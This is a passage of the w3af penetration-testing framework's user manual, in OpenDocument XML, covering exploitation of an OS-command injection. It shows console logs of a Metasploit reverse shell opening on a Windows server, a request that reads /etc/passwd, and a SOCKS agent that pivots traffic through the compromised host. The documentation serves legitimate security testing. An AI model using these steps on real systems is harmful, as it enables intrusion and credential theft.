      <text:p text:style-name="P49"><text:span text:style-name="T3">w3af/exploit/osCommandingShell&gt;&gt;&gt;</text:span> <text:span text:style-name="T3">start vdaemon </text:span></text:p>
      <text:p text:style-name="P49">Virtual daemon service is running on port 9091, use metasploit's w3af_vdaemon module to exploit it. </text:p>
      <text:p text:style-name="P50">w3af/exploit/osCommandingShell&gt;&gt;&gt; </text:p>
      <text:p text:style-name="P50"/>
      <text:p text:style-name="P34">Nothing special for now, just added the new “<text:span text:style-name="T5">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1">
        <text:list-item>
          <text:p text:style-name="P104">The target is of course the remote operating system you are exploiting</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P104">VNC payloads don't seem to work</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P104">RHOST parameter indicates the IP address of the server you are exploiting</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P104">LHOST is your public IP address</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P104">LPORT is a port where the remote web server can connect to (when using reverse connect payloads) or you can connect to ( when using bind payloads )</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P104">The w3af module inside metasploit will connect to localhost:9091 and do all the payload transfer, this parameters can't be configured and must not be confused with RHOST/LHOST and LPORT</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P32">Once it has been configured, we can click on “Launch Exploit” to start the process, this is what we will see in the w3af console:</text:p>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P49"><text:span text:style-name="T3">w3af/exploit/osCommandingShell&gt;&gt;&gt;</text:span> </text:p>
      <text:p text:style-name="P49">Please wait some seconds while w3af performs an extrusion scan. </text:p>
      <text:p text:style-name="P49">The extrusion test failed, no reverse connect transfer methods can be used. Trying inband echo transfer method. </text:p>
      <text:p text:style-name="P49">Error: The user running w3af can't sniff on the specified interface. Hints: Are you root? Does this interface exist? </text:p>
      <text:p text:style-name="P49">Successfully transfered the MSF payload to the remote server. </text:p>
      <text:p text:style-name="P49">Successfully executed the MSF payload on the remote server. </text:p>
      <text:p text:style-name="P49"/>
      <text:p text:style-name="P34"><text:soft-page-break/><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33">Selecting port "8080/TCP" for inbound connections from the compromised server to w3af. </text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P32">And if we take a look at the metasploit web interface we will find something far more interesting:</text:p>
      <text:p text:style-name="P33"/>
      <text:p text:style-name="P49">[*] Started reverse handler </text:p>
      <text:p text:style-name="P49">[*] The remote IP address is: 172.16.1.128 </text:p>
      <text:p text:style-name="P49">[*] Using remote IP address to create payloads. </text:p>
      <text:p text:style-name="P49">[*] Sent payload to vdaemon. </text:p>
      <text:p text:style-name="P49"><text:soft-page-break/>[*] The estimated time to wait for the extrusion scan to complete is: 1 seconds. </text:p>
      <text:p text:style-name="P49">[*] Done waiting! </text:p>
      <text:p text:style-name="P49">[*] The estimated time to wait for PE/ELF transfer is: 8 seconds. </text:p>
      <text:p text:style-name="P49">[*] Waiting... </text:p>
      <text:p text:style-name="P49">[*] Done waiting! </text:p>
      <text:p text:style-name="P49">[*] Going to wait for 27 seconds (waiting for crontab/at to execute payload). </text:p>
      <text:p text:style-name="P49">[*] The session could start before the handler, so please *be patient*. </text:p>
      <text:p text:style-name="P49">[*] Command shell session 1 opened (172.16.1.1:4444 -&gt; 172.16.1.128:1047) </text:p>
      <text:p text:style-name="P49">[*] Done waiting! </text:p>
      <text:p text:style-name="P49">[*] Starting handler </text:p>
      <text:list text:style-name="L12">
        <text:list-header>
          <text:p text:style-name="P127">Microsoft Windows 2000 [Version 5.00.2195] </text:p>
          <text:p text:style-name="P127">(C) Copyright 1985-2000 Microsoft Corp.</text:p>
          <text:p text:style-name="P94"/>
          <text:p text:style-name="P127">C:\WINNT\system32&gt;</text:p>
        </text:list-header>
      </text:list>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P32">Now the user has an interactive shell with the privileges of the user running the web server, that can be used without any restrictions, you could even close w3af now and continue working directly from the metasploit shell.</text:p>
      <text:p text:style-name="P32"/>
      <text:h text:style-name="P35" text:outline-level="3">w3afAgent</text:h>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P32">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4">
        <text:list-item>
          <text:p text:style-name="P110">w3af finds a vulnerability that allows remote command execution</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P110">The user exploits the vulnerability and starts the w3afAgent</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P110">w3af performs an extrusion scan by sending a small executable to the remote server. This executable connects back to w3af and allows the framework to identify outgoing firewall rules on the remote network.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P110">w3afAgent Manager will send a w3afAgentClient to the remote server. <text:span text:style-name="T6">The </text:span><text:soft-page-break/><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5">
        <text:list-item>
          <text:p text:style-name="P89">w3af reuses the information from the first extrusion scan, which was performed in step 3 in order to know which port it can use to listen for connections from the compromised server.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P89">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4" text:continue-numbering="true">
        <text:list-item>
          <text:p text:style-name="P110">w3afAgent Manager starts the w3afAgentServer that will bind on localhost:1080 (which will be used by the w3af user) and on the interface configured in w3af ( misc-settings-&gt;interface ) on the port discovered during step 3.</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P110">The w3afAgentClient connects back to the w3afAgentServer, successfully creating the tunnel</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P110">The user configures the proxy listening on localhost:1080 on his preferred software</text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P110">When the program connects to the socks proxy, all outgoing connections are routed through the compromised server</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P32">Now that we know the theory, let's see an example of what this feature can do:</text:p>
      <text:p text:style-name="P49"><text:span text:style-name="T3">$</text:span> ./w3af</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0.10.1/w3af/v.php?c=list </text:p>
      <text:p text:style-name="P49"><text:span text:style-name="T3">w3af/target&gt;&gt;&gt;</text:span> back </text:p>
      <text:p text:style-name="P49"><text:span text:style-name="T3">w3af&gt;&gt;&gt;</text:span> start </text:p>
      <text:p text:style-name="P49">The list of found URLs is: </text:p>
      <text:p text:style-name="P49">- <text:span text:style-name="T4">http://172.10.10.1/w3af/v.php</text:span> </text:p>
      <text:p text:style-name="P49">Found 1 URLs and 1 different points of injection. </text:p>
      <text:p text:style-name="P49"><text:soft-page-break/>The list of Fuzzable requests is: </text:p>
      <text:p text:style-name="P49">- <text:span text:style-name="T4">http://172.10.10.1/w3af/v.php</text:span> | Method: GET | Parameters: (c) </text:p>
      <text:p text:style-name="P49">Starting osCommanding plugin execution. </text:p>
      <text:p text:style-name="P49">OS Commanding was found at: <text:span text:style-name="T4">http://172.10.10.1/w3af/v.php</text:span> . Using method: GET. The data sent was: c=%2Fbin%2Fcat+%2Fetc%2Fpasswd The vulnerability was found in the request with id 2.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
      <text:p text:style-name="P32">Nothing really new until now, we configured w3af, started the scan and exploited the vulnerability.</text:p>
      <text:p text:style-name="P49"/>
      <text:p text:style-name="P49"><text:span text:style-name="T3">w3af/exploit/osCommandingShell&gt;&gt;&gt;</text:span> <text:span text:style-name="T3">start w3afAgent </text:span></text:p>
      <text:p text:style-name="P49">Initializing w3afAgent system, please wait. </text:p>
      <text:p text:style-name="P49">Please wait some seconds while w3af performs an extrusion scan. </text:p>
      <text:p text:style-name="P49">The extrusion scan failed. </text:p>
      <text:p text:style-name="P49">Error: The user running w3af can't sniff on the specified interface. Hints: Are you root? Does this interface exist? </text:p>
      <text:p text:style-name="P49">Using inbound port "5060" without knowing if the remote host will be able to connect back. </text:p>
      <text:p text:style-name="P49"/>
      <text:p text:style-name="P32">The last messages are printed when you run w3af as a normal user, the reason is simple, when you run w3af as a user you can't sniff and therefor can't perform a successful extrusion scan. A successful extrusion scan would look like:</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text:soft-page-break/>-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49">Selecting port "8080/TCP" for inbound connections from the compromised server to w3af. </text:p>
      <text:p text:style-name="P49"/>
      <text:p text:style-name="P32">In both cases (superuser and user), these should be the following steps:</text:p>
      <text:p text:style-name="P49"/>
      <text:p text:style-name="P49">Starting w3afAgentClient upload. </text:p>
      <text:p text:style-name="P49">Finished w3afAgentClient upload. </text:p>
      <text:p text:style-name="P49">Please wait 30 seconds for w3afAgentClient execution. </text:p>
      <text:p text:style-name="P49">w3afAgent service is up and running. </text:p>
      <text:p text:style-name="P49">You may start using the w3afAgent that is listening on port 1080. All connections made through this SOCKS daemon will be relayed using the compromised server. </text:p>
      <text:p text:style-name="P49"/>
      <text:p text:style-name="P32">And now, from another console we can use a socksClient to route connections through the compromised server:</text:p>
      <text:p text:style-name="P32"/>
      <text:p text:style-name="P49"><text:span text:style-name="T3">$</text:span> nc <text:span text:style-name="T4">172.10.10.1 22</text:span></text:p>
      <text:p text:style-name="P49">(UNKNOWN) [172.10.10.1] 22 (ssh) : Connection refused </text:p>
      <text:p text:style-name="P49"/>
      <text:p text:style-name="P49"><text:soft-page-break/><text:span text:style-name="T3">$</text:span> python socksClient.py 127.0.0.1 22</text:p>
      <text:p text:style-name="P49">SSH-2.0-OpenSSH_4.3p2 Debian-8ubuntu1 </text:p>
      <text:p text:style-name="P49">Protocol mismatch. </text:p>
      <text:p text:style-name="P49"/>
      <text:p text:style-name="P49"><text:span text:style-name="T3">$</text:span> cat socksClient.py</text:p>
      <text:p text:style-name="P49">import extlib.socksipy.socks as socks </text:p>
      <text:p text:style-name="P49">import sys </text:p>
      <text:p text:style-name="P49"/>
      <text:p text:style-name="P49">s = socks.socksocket() </text:p>
      <text:p text:style-name="P49">s.setproxy(socks.PROXY_TYPE_SOCKS4,"localhost") </text:p>
      <text:p text:style-name="P49">s.connect((sys.argv[1],int(sys.argv[2]))) </text:p>
      <text:p text:style-name="P49"/>
      <text:p text:style-name="P49">s.send('\n') </text:p>
      <text:p text:style-name="P49">print s.recv(1024) </text:p>
      <text:p text:style-name="P49"/>
      <text:p text:style-name="P33"/>
      <text:h text:style-name="P55" text:outline-level="2">More information</text:h>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15">More information about the framework, ( usage, bugs, TODO list and news ) can be found in the project homepage:</text:p>
      <text:p text:style-name="P47"><text:a xlink:type="simple" xlink:href="http://w3af.sf.net/">http://w3af.sf.net/</text:a> .</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15">I have also created two mailing lists, one for developers and one for users, both are public. The URL for the mailing lists is: </text:p>
      <text:p text:style-name="P47"><text:a xlink:type="simple" xlink:href="http://sourceforge.net/mail/?group_id=170274">http://sourceforge.net/mail/?group_id=170274</text:a></text:p>
      <text:p text:style-name="P24"/>
      <text:h text:style-name="Heading_20_2" text:outline-level="2">Bugs</text:h>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="P36">The framework is still under development and has <text:span text:style-name="T1">many</text:span> known ( and unknown of course! ) bugs. Code contribution is welcome, a plugin developer guide will be written shortly to aid new developers enter the w3af world. For a list of known bugs and a TODO list, please see:</text:p>
      <text:p text:style-name="P36"/>
      <text:p text:style-name="P48"><text:soft-page-break/><text:a xlink:type="simple" xlink:href="http://sourceforge.net/pm/?group_id=170274">http://sourceforge.net/pm/?group_id=170274</text:a></text:p>
      <text:p text:style-name="P48"/>
      <text:h text:style-name="P28" text:outline-level="2"/>
      <text:h text:style-name="P28" text:outline-level="2">Final words</text:h>
      <text:p text:style-name="Text_20_body"/>
      <text:p text:style-name="P36">This document is merely and introduction, complete knowledge about the framework and its usage is complex and can be achieved only by using it.</text:p>
      <text:p text:style-name="P36"/>
      <text:p text:style-name="P36">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5-14T16:45:42</meta:creation-date>
    <dc:creator>dz0</dc:creator>
    <dc:date>2008-01-09T20:10:24</dc:date>
    <meta:editing-cycles>65</meta:editing-cycles>
    <meta:editing-duration>P1DT12H34M4S</meta:editing-duration>
    <meta:user-defined meta:name="Info 1"/>
    <meta:user-defined meta:name="Info 2"/>
    <meta:user-defined meta:name="Info 3"/>
    <meta:user-defined meta:name="Info 4"/>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="35" meta:paragraph-count="713" meta:word-count="7035" meta:character-count="45544"/>
  </office:meta>
</office:document-meta>
</file>